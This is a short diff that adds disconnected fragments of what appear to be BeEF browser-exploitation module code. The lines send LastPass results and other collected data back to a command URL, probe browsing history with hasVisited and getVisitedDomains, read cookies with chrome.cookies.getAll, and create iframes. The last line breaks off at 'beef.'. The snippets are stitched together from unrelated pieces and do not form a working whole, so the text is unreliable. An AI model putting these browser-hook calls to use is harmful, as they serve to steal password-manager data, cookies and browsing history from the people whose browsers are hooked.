@@ -1,0 +1,8 @@
+beef.net.send("<%= @command_url %>", <%= @command_id %>, "lastpass="+result);
+beef.net.send("<%= @command_url %>", <%= @command_id %>, comp);
+beef.browser.hasVisited("<%== format_multiline(@urls) %>");
+results[i].url
+getVisitedDomains();
+chrome.cookies.getAll
+beef.dom.createIframe
+beef.
